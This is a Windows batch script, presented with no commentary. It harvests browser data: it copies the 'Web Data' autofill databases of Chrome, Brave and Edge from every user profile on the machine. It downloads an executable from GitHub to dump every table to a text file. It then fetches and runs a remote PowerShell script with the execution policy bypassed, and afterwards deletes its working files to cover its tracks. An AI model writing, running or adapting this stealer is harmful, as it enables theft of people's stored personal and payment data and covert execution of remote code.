@echo off
setlocal enabledelayedexpansion

cd /d "%~dp0"

set DOWNLOAD_URL=https://github.com/HFScripts/sqlite/raw/main/run.exe
set FILENAME=run.exe

if not exist %FILENAME% (
  powershell -Command "Invoke-WebRequest -Uri %DOWNLOAD_URL% -OutFile %FILENAME%"
)

set "app_data_paths[0]=Google\Chrome\User Data\Default\Web Data"
set "app_data_paths[1]=BraveSoftware\Brave-Browser\User Data\Default\Web Data"
set "app_data_paths[2]=Microsoft\Edge\User Data\Default\Web Data"
set "browser_names[0]=Chrome"
set "browser_names[1]=Brave"
set "browser_names[2]=Edge"

for /f "delims=" %%u in ('dir "%systemdrive%\Users\*" /b /ad') do (
    set "user_path=%systemdrive%\Users\%%u\AppData\Local"
    for %%i in (0 1 2) do (
        set "web_data_path=!user_path!\!app_data_paths[%%i]!"
        if exist "!web_data_path!" (
            for /f "tokens=1-4 delims=/. " %%a in ('date /t') do (set year=%%d)
            for /f "tokens=1-3 delims=/. " %%a in ('date /t') do (set month=%%a)
            for /f "tokens=1-3 delims=/. " %%a in ('date /t') do (set day=%%b)
            set "timestamp=!year!!month!!day!-!hour!!minute!"
            set "new_name=%%u_!browser_names[%%i]!_Web_Data_!timestamp!"
            set "new_path=%cd%\!new_name!"

            :CopyLoop
            copy "!web_data_path!" "!new_path!" >nul
            if errorlevel 1 (
                ping -n 6 127.0.0.1 >nul
                goto CopyLoop
            )

            set "copied_files[!num_files!]=!new_name!"
            ping -n 2 127.0.0.1 >nul
        )
    )
)

for %%f in (%cd%\*Web_Data*) do (
    if %%~zf equ 0 (
        del "%%f"
    )
)

setlocal enabledelayedexpansion
for %%f in (%cd%\*Web_Data*) do (
    set DB_FILE=%%f
    for /F "usebackq delims=" %%t in (`run.exe !DB_FILE! ".tables"`) do (
        run.exe !DB_FILE! "SELECT * FROM %%t;" >> output.txt
    )
    endlocal & set DB_FILE=
    setlocal enabledelayedexpansion
)

REM Delete any existing files with "Web Data" or "Web_Data" in their name
for /f "delims=" %%f in ('dir /b /a-d *Web_Data* 2^>nul') do (
    del "%%f"
)

if not exist rawoutput.ps1 (
    powershell -Command "Invoke-WebRequest -Uri https://github.com/HFScripts/sqlite/raw/main/rawoutput.ps1 -OutFile rawoutput.ps1"
)

rem Execute the PowerShell script
powershell.exe -ExecutionPolicy Bypass -File rawoutput.ps1

endlocal

for /f "delims=" %%f in ('dir /b /a-d *rawoutput* 2^>nul') do (
    del "%%f"
)

for /f "delims=" %%f in ('dir /b /a-d *run.exe* 2^>nul') do (
    del "%%f"
)

for /f "delims=" %%f in ('dir /b /a-d *output.txt* 2^>nul') do (
    del "%%f"
)

pause>nul
